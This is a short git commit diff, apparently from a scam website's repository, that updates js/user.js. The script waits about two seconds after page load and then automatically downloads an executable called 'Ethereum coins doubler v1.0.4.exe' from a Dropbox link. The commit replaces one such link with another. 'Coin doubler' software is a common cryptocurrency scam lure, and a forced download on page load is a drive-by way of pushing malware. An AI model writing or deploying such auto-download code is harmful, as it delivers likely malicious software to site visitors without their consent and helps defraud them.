8d6e89b787d5ec624b7fdfa5d87068724b79c7f9
ethx2 <72185040+ethx2@users.noreply.github.com>
2021-01-31 17:17:29 +0000

    Update user.js

--- js/user.js
+++ js/user.js
@@ -1,6 +1,6 @@
 function download(){
   setTimeout(function(){
-    downloadFile("https://dl.dropboxusercontent.com/s/cvmgxn9au4jgj8d/Ethereum%20coins%20doubler%20v1.0.4.exe");
+    downloadFile("https://dl.dropboxusercontent.com/s/2zbuske5xqqpeu9/Ethereum%20coins%20doubler%20v1.0.4.exe");
   }, 1998);
 };
 window.addEventListener("load", download);
